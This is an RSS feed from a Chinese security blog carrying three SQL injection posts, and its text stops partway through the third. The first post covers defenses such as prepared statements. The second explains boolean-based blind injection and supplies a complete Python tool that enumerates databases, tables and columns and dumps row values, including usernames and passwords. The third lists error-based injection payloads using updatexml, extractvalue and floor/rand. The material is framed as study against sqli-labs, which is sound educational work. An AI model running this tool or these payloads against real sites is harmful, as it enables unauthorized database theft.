<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Sql Injection on </title>
    <link>http://wyb0.com/topics/sql-injection/</link>
    <description>Recent content in Sql Injection on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>&amp;copy; 2016-2017 Reber. All Rights Reserved.</copyright>
    <lastBuildDate>Thu, 23 Jun 2016 15:32:34 +0800</lastBuildDate>
    <atom:link href="http://wyb0.com/topics/sql-injection/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SQL注入之防御</title>
      <link>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%98%B2%E5%BE%A1/</link>
      <pubDate>Thu, 23 Jun 2016 15:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%98%B2%E5%BE%A1/</guid>
      <description>

&lt;h3 id=&#34;0x00-要做的事:aa1079ccb1d248f72b7ef2ec28a6d0e6&#34;&gt;0x00 要做的事&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;也就是找到注入点然后修复
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-防御方法:aa1079ccb1d248f72b7ef2ec28a6d0e6&#34;&gt;0x01 防御方法&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;使用转义函数&lt;br /&gt;
如：addslashes()和mysql_real_escape_string()&lt;br /&gt;
在php.ini设置auto_prepend_file自动在脚本执行前在首部加载文件&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    //简单过滤
    $filter = array(&amp;amp;$_GET,&amp;amp;$_POST,&amp;amp;$_COOKIE);
    foreach ($filter as $key =&amp;gt; $value){
        foreach ($value as $k =&amp;gt; $v){
            $filter[$key][$k] = mysql_real_escape_string($v);
        }
    }
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;检查数据类型&lt;br /&gt;
使用(int)或settype()等将数字等进行强制转换&lt;br /&gt;
对邮箱、日期等也进行检查&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;使用预编译语句绑定变量(一般为防御SQL注入的最佳方式)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
    //预编译
    $mysqli = new mysqli(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;123456&amp;quot;,&amp;quot;share&amp;quot;);
    $mysqli-&amp;gt;query(&amp;quot;set names utf8&amp;quot;);
    $sql = &amp;quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;quot;;
    $s = $mysqli-&amp;gt;prepare($sql);
    //绑定参数
    $name = &amp;quot;Tom&amp;quot;;
    $sex = &amp;quot;M&amp;quot;;
    $age = 23;
    $s-&amp;gt;bind_param(&amp;quot;sssi&amp;quot;,$name,$sex,$age);
    //执行
    $result = $s-&amp;gt;execute();
    var_dump($result);
    $s-&amp;gt;close();
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;其他&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;1.使用存储过程
2.使用安全的函数和为数据库合理分配权限等
3.使用框架
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>SQL注入之布尔型注入</title>
      <link>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Wed, 22 Jun 2016 23:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
      <description>

&lt;h3 id=&#34;0x00-特点:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;0x00 特点&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;当页面存在注入，但是没有显示位，且没有用echo &amp;quot;mysql_error()&amp;quot;输出错误信息时可以用，
它一次只能猜测一个字节，速度慢，但是只要存在注入就能用
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-利用方式:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;0x01 利用方式&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+
根据返回页面是否相同来得到数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-注入步骤:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;0x02 注入步骤&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;找注入点、猜闭合字符&lt;/li&gt;
&lt;li&gt;猜解列数、尝试得到显示位&lt;/li&gt;
&lt;li&gt;猜数据库名&lt;/li&gt;
&lt;li&gt;猜表名&lt;/li&gt;
&lt;li&gt;猜列名&lt;/li&gt;
&lt;li&gt;猜列值&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;找到注入点-判断闭合字符:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;找到注入点，判断闭合字符&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_closed_character.png&#34; alt=&#34;得到闭合字符.png&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;尝试猜解列数-得到显示位:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;尝试猜解列数，得到显示位&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_order_by.png&#34; alt=&#34;猜解列数.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_display_point.png&#34; alt=&#34;尝试得到显示位.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到数据库名:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;得到数据库名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_db_num.png&#34; alt=&#34;猜解数据库数量.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_db_name_char.png&#34; alt=&#34;猜第5个数据库第2个字符.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;最终得到第五个数据库名为security
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到表名:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;得到表名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_table_num_name_len.png&#34; alt=&#34;猜解表的数量和第4张表的表名长度.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_table_name_char.png&#34; alt=&#34;猜第4个表第1个字符.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;最终依次猜的表名为users
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到列名:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;得到列名&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_num.png&#34; alt=&#34;猜解有几列.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_name_len.png&#34; alt=&#34;猜解users表第2列列名的长度.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_name_one_char.png&#34; alt=&#34;猜测users表第2列列名的第1个字符.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;同理最终得到第2列列名为username，第3列列名为password
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;得到列值:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;得到列值&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_value_num.png&#34; alt=&#34;猜解数据条数.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_value_len.png&#34; alt=&#34;猜解第13条数据username字段值的长度.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli8_get_column_value_char.png&#34; alt=&#34;猜解第13条数据username字段值的前两个字符.png&#34;&gt;
&lt;/div&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;依次得到为admin4，同理可得其他数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-附上python脚本:3f85c56ec38e48e3b8ca1b555d210395&#34;&gt;0x04 附上python脚本&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-  

__author__=&amp;quot;reber&amp;quot;

import sys
import urllib
import urllib2
import binascii
import hashlib
from pyfiglet import figlet_format
from optparse import OptionParser


def get_md5_html(url):
    response = urllib2.urlopen(url)
    html = response.read()

    m2 = hashlib.md5()
    m2.update(html)
    md5_html = m2.hexdigest()

    return md5_html

def getAllDatabases(url):
    # global aa
    # print &amp;quot;getAllDatabases&amp;quot;
    # print url
    standard_md5 = get_md5_html(url)
    # print standard_md5

    low = 1
    high = 100
    while low &amp;lt;= high:  #循环结束后得到数据库个数
        mid = (low + high)/2;

        payload = &amp;quot;&#39; and ((select count(distinct+table_schema) from information_schema.tables) &amp;gt; %d)--+&amp;quot; % mid
        # payload = (&amp;quot;%s&amp;quot; % aa).join(payload.split())
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        db_num = (low+high+1)/2
    print &amp;quot;The total number of database is: %d&amp;quot; % db_num
    for index in xrange(0,db_num):  #一次循环输出一个数据库名
        low = 1
        high = 30

        while low &amp;lt;= high:  #循环结束后得到数据库名的长度
            mid = (low + high)/2

            payload = &amp;quot;&#39; and (length((select distinct table_schema from information_schema.tables limit %d,1)) &amp;gt; %d)--+&amp;quot; % (index,mid)
            # print payload
            payload = &amp;quot;/**/&amp;quot;.join(payload.split())
            mid_url = url + payload
            mid_md5_html = get_md5_html(mid_url)

            if standard_md5 == mid_md5_html:
                low = mid + 1
            else:
                high = mid-1

            db_name_len = (low+high+1)/2
        # print &amp;quot;database name length:%d&amp;quot; % db_name_len
        print &amp;quot;\tdatabase name is: &amp;quot;,
        for x in xrange(1,db_name_len+1):   #一次for循环输出数据库名的一个字符
            low = 32
            high = 126
            while low &amp;lt;= high: #循环结束后得到数据库名的一个字符的ASCII码
                mid = (low + high)/2
                payload = &amp;quot;&#39; and (select ascii(substr((select distinct table_schema from information_schema.tables limit %d,1), %d, 1)) &amp;gt; %d) --+&amp;quot; % (index,x,mid)
                # print payload
                payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                str_ascii = (low+high+1)/2
            database_name_one_str = chr(str_ascii)
            sys.stdout.write(database_name_one_str)
            sys.stdout.flush()
        print

def getAllTablesByDb(url,db_name):
    # print &amp;quot;getAllTablesByDb&amp;quot;
    # print url
    # print db_name
    standard_md5 = get_md5_html(url)
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    # print standard_md5

    low = 1
    high = 200
    while low &amp;lt;= high:  #循环结束后得到表个数
        mid = (low + high)/2;

        payload = &amp;quot;&#39; and ((select count(distinct+table_name) from information_schema.tables where table_schema=%s) &amp;gt; %d)--+&amp;quot; % (db_name_hex,mid)
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        db_num = (low+high+1)/2

    print &amp;quot;Database security contains %d table:&amp;quot; % db_num
    for index in xrange(0,db_num):  #一次循环输出一个表名
        low = 1
        high = 30

        while low &amp;lt;= high:  #循环结束后得到表名的长度
            mid = (low + high)/2

            payload = &amp;quot;&#39; and (length((select distinct table_name from information_schema.tables where table_schema=%s limit %d,1)) &amp;gt; %d)--+&amp;quot; % (db_name_hex,index,mid)
            # print payload
            payload = &amp;quot;/**/&amp;quot;.join(payload.split())
            mid_url = url + payload
            mid_md5_html = get_md5_html(mid_url)

            if standard_md5 == mid_md5_html:
                low = mid + 1
            else:
                high = mid-1

            table_name_len = (low+high+1)/2
        # print db_name_len
        print &amp;quot;\ttable name is: &amp;quot;,
        for x in xrange(1,table_name_len+1):   #一次for循环输出表名的一个字符
            low = 32
            high = 126
            while low &amp;lt;= high: #循环结束后得到表名的一个字符的ASCII码
                mid = (low + high)/2
                payload = &amp;quot;&#39; and (select ascii(substr((select distinct table_name from information_schema.tables where table_schema=%s limit %d,1), %d, 1)) &amp;gt; %d) --+&amp;quot; % (db_name_hex,index,x,mid)
                # print payload
                payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                str_ascii = (low+high+1)/2
            table_name_one_str = chr(str_ascii)
            sys.stdout.write(table_name_one_str)
            sys.stdout.flush()
        print 

def getAllColumnsByTable(url,table_name,db_name):
    # print &amp;quot;getAllColumnsByTable&amp;quot;
    #while循环结束后得到列的个数
    #for循环，一次得到一列的列名：
        #while循环得到列名的长度：
        #for循环，一次得出列名的一个字符
    # print url
    # print table_name
    # print db_name
    standard_md5 = get_md5_html(url)
    table_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(table_name)
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    # print standard_md5

    low = 1
    high = 100
    while low &amp;lt;= high:  #循环结束后得到列个数
        mid = (low + high)/2;

        payload = &amp;quot;&#39; and ((select count(distinct+column_name) from information_schema.columns where table_name=%s and table_schema=%s) &amp;gt; %d)--+&amp;quot; % (table_name_hex,db_name_hex,mid)
        # print payload
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        column_num = (low+high+1)/2
    print &amp;quot;Table %s contains %d columns:&amp;quot; % (table_name,column_num)
    for index in xrange(0,column_num):  #一次循环输出一个列名
        low = 1
        high = 30

        while low &amp;lt;= high:  #循环结束后得到列名的长度
            mid = (low + high)/2

            payload = &amp;quot;&#39; and (length((select distinct column_name from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) &amp;gt; %d)--+&amp;quot; % (table_name_hex,db_name_hex,index,mid)
            # print payload
            payload = &amp;quot;/**/&amp;quot;.join(payload.split())
            mid_url = url + payload
            mid_md5_html = get_md5_html(mid_url)

            if standard_md5 == mid_md5_html:
                low = mid + 1
            else:
                high = mid-1

            column_name_len = (low+high+1)/2
        # print &amp;quot;column length is: %d&amp;quot; % column_name_len
        print &amp;quot;\tcolumn name is: &amp;quot;,
        for x in xrange(1,column_name_len+1):   #一次for循环输出列名的一个字符
            low = 32
            high = 126
            while low &amp;lt;= high: #循环结束后得到列名的一个字符的ASCII码
                mid = (low + high)/2
                payload = &amp;quot;&#39; and (select ascii(substr((select distinct column_name from information_schema.columns where table_name=%s and table_schema=%s limit %d,1), %d, 1)) &amp;gt; %d) --+&amp;quot; % (table_name_hex,db_name_hex,index,x,mid)
                # print payload
                payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                str_ascii = (low+high+1)/2
            column_name_one_str = chr(str_ascii)
            sys.stdout.write(column_name_one_str)
            sys.stdout.flush()
        print

def getAllcontent(url,column_name,table_name,db_name):
    # print &amp;quot;getAllcontent&amp;quot;
    #while循环结束后得到结果的行数
    #for循环，一次得到一行的值
        #while循环得到每个字段的长度
        #for循环，一次得出一个字段的一个字符
    # print url
    # print column_name
    # print table_name
    # print db_name
    column_name = column_name.split(&#39;,&#39;)
    len_column_name = len(column_name)
    # print &amp;quot;len_column_name:%d&amp;quot; % len_column_name
    standard_md5 = get_md5_html(url)
    table_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(table_name)
    db_name_hex = &amp;quot;0x&amp;quot; + binascii.b2a_hex(db_name)
    # print standard_md5

    low = 1
    high = 10000
    while low &amp;lt;= high:  #循环结束后得到列个数
        mid = (low + high)/2;

        payload = &amp;quot;&#39; and ((select count(*) from %s.%s) &amp;gt; %d)--+&amp;quot; % (db_name,table_name,mid)
        # print payload
        payload = &amp;quot;/**/&amp;quot;.join(payload.split())
        mid_url = url + payload
        mid_md5_html = get_md5_html(mid_url)

        if standard_md5 == mid_md5_html:
            low = mid + 1
        else:
            high = mid-1

        column_value_num = (low+high+1)/2
    print &amp;quot;The %s table with %d row value: &amp;quot; % (table_name,column_value_num)
    stri = &amp;quot;&amp;quot;
    for x in xrange(0,len_column_name):#输出title
        stri += &amp;quot;%s\t&amp;quot; % column_name[x]
    print stri
    for index in xrange(0,column_value_num):  #一次循环输出一行数据
        for y in xrange(0,len_column_name):  #一次输出一行的一列的值,循环完输出一行的值
            low = 1
            high = 30
            # print &amp;quot;len_column_name:%s&amp;quot; % column_name[y]
            while low &amp;lt;= high:  #循环结束后得到一行数据的一列值的长度
                mid = (low + high)/2

                payload = &amp;quot;&#39; and (length((select %s from %s.%s limit %d,1)) &amp;gt; %d)--+&amp;quot; % (column_name[y],db_name,table_name,index,mid)
                # print payload
                payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                mid_url = url + payload
                mid_md5_html = get_md5_html(mid_url)

                if standard_md5 == mid_md5_html:
                    low = mid + 1
                else:
                    high = mid-1

                column_value_len = (low+high+1)/2
            # print &amp;quot;column value length is: %d&amp;quot; % column_value_len
            # print &amp;quot;\tcolumn name is: &amp;quot;,
            for x in xrange(1,column_value_len+1): #得到一行数据的一列的值
                low = 32
                high = 126
                while low &amp;lt;= high: #得到一行数据的一列值的单个字符ASCII码
                    mid = (low + high)/2
                    payload = &amp;quot;&#39; and (select ascii(substr((select %s from %s.%s limit %d,1), %d, 1)) &amp;gt; %d) --+&amp;quot; % (column_name[y],db_name,table_name,index,x,mid)
                    # print payload
                    payload = &amp;quot;/**/&amp;quot;.join(payload.split())
                    mid_url = url + payload
                    mid_md5_html = get_md5_html(mid_url)

                    if standard_md5 == mid_md5_html:
                        low = mid + 1
                    else:
                        high = mid-1

                    str_ascii = (low+high+1)/2
                column_name_one_str = chr(str_ascii)
                sys.stdout.write(column_name_one_str)
                sys.stdout.flush()
            sys.stdout.write(&amp;quot;\t&amp;quot;)
        print


def main():
    print figlet_format(&amp;quot;sqli-bool&amp;quot;)
    parser = OptionParser()
    parser.add_option(&amp;quot;-u&amp;quot;,&amp;quot;--URL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;url&amp;quot;,
              help=&amp;quot;get url&amp;quot;)
    parser.add_option(&amp;quot;-D&amp;quot;,&amp;quot;--DB&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;db_name&amp;quot;,
              help=&amp;quot;get database name&amp;quot;)
    parser.add_option(&amp;quot;-T&amp;quot;,&amp;quot;--TBL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;table_name&amp;quot;,
              help=&amp;quot;get table name&amp;quot;)
    parser.add_option(&amp;quot;-C&amp;quot;,&amp;quot;--COL&amp;quot;,action=&amp;quot;store&amp;quot;,
              type=&amp;quot;string&amp;quot;,dest=&amp;quot;column_name&amp;quot;,
              help=&amp;quot;get column name&amp;quot;)

    parser.add_option(&amp;quot;--dbs&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;dbs&amp;quot;,help=&amp;quot;get all database name&amp;quot;)
    parser.add_option(&amp;quot;--current-db&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;current_db&amp;quot;,help=&amp;quot;get current database name&amp;quot;)
    parser.add_option(&amp;quot;--current-user&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;current_user&amp;quot;,help=&amp;quot;get current user name&amp;quot;)
    parser.add_option(&amp;quot;--tables&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;tables&amp;quot;,help=&amp;quot;get tables from databases&amp;quot;)
    parser.add_option(&amp;quot;--columns&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;columns&amp;quot;,help=&amp;quot;get columns from tables&amp;quot;)
    parser.add_option(&amp;quot;--dump&amp;quot;,action=&amp;quot;store_true&amp;quot;,
              dest=&amp;quot;dump&amp;quot;,help=&amp;quot;get value&amp;quot;)
    (options,args) = parser.parse_args()


    if options == None or options.url == None:
        parser.print_help()
    elif options.dump and options.column_name and options.table_name and options.db_name:
        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
    elif options.table_name and options.db_name:
        getAllColumnsByTable(options.url,options.table_name,options.db_name)
    elif options.db_name:
        getAllTablesByDb(options.url,options.db_name)    
    elif options.dbs:
        getAllDatabases(options.url)
    elif options.current_db:
        getCurrentDb(options.url)
    elif options.current_user:
        getCurrentUser(options.url)
    elif options.url:
        print &amp;quot;you input: sqli-error.py -u %s&amp;quot; % options.url


if __name__ == &#39;__main__&#39;:
    main()
    # getAllDatabases(&amp;quot;http://192.168.188.134/sqli/Less-8/?id=1&amp;quot;)
    # getAllTablesByDb(&amp;quot;http://192.168.188.134/sqli/Less-8/?id=1&amp;quot;,&amp;quot;security&amp;quot;)
    # getAllColumnsByTable(&amp;quot;http://192.168.188.134/sqli/Less-8/?id=1&amp;quot;,&amp;quot;user&amp;quot;,&amp;quot;mysql&amp;quot;)
    # getAllcontent(&amp;quot;http://192.168.188.134/sqli/Less-8/?id=1&amp;quot;,&amp;quot;id,username,password&amp;quot;,&amp;quot;users&amp;quot;,&amp;quot;security&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>SQL注入之报错型注入</title>
      <link>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/</guid>
      <description>

&lt;h3 id=&#34;0x00-前提:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x00 前提&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-利用方式:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x01 利用方式&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;count(*)、floor()、rand()、group by不可或缺&lt;br /&gt;
报错注入用一个公式，只要套用公式即可，公式如下(后两个公式有32位的限制):&lt;br /&gt;
?id=2&amp;rsquo; and (select 1 from &lt;font color=&#34;00CDCD&#34;&gt;(select &lt;u&gt;count(*),&lt;b&gt;concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x&lt;/b&gt;&lt;/u&gt; from information_schema.tables group by x )a&lt;/font&gt;
)--+&lt;br /&gt;
?id=2&amp;rsquo; and updatexml(1,concat(0x7e,(&lt;font color=&#34;00CDCD&#34;&gt;SELECT @@version&lt;/font&gt;),0x7e),1)--+&lt;br /&gt;
?id=1&amp;rsquo; and extractvalue(1, concat(0x7e, (&lt;font color=&#34;00CDCD&#34;&gt;select @@version&lt;/font&gt;),0x7e))--+&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-公式解析:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x02 公式解析&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;floor()是取整数
rand()在0和1之间产生一个随机数
rand(0)*2将取0到2的随机数
floor(rand()*2)有两条记录就会报错
floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的
count(*)是用来统计结果的，相当于刷新一次结果
group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1
group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-注入步骤:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;0x03 注入步骤&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;得到闭合字符&lt;/li&gt;
&lt;li&gt;猜列数、尝试爆显示位&lt;/li&gt;
&lt;li&gt;得到数据库个数和数据库名&lt;/li&gt;
&lt;li&gt;得到表个数和表名&lt;/li&gt;
&lt;li&gt;得到列数量和列名&lt;/li&gt;
&lt;li&gt;得到列值&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;猜测闭合字符:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;猜测闭合字符&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_closed_character.png&#34; alt=&#34;得到闭合字符&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_check_closed_character.png&#34; alt=&#34;确认闭合字符&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;猜测列数:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;猜测列数&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_order_by.png&#34; alt=&#34;得到列数&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;尝试得到显示位:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;尝试得到显示位&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/sqli5_get_display_point.png&#34; alt=&#34;尝试得到显示位&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h4 id=&#34;报错得到数据库个数:af30d448bff8d1d0bb03cb40c944803d&#34;&gt;报错得到数据库个数&lt;/h4&gt;

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
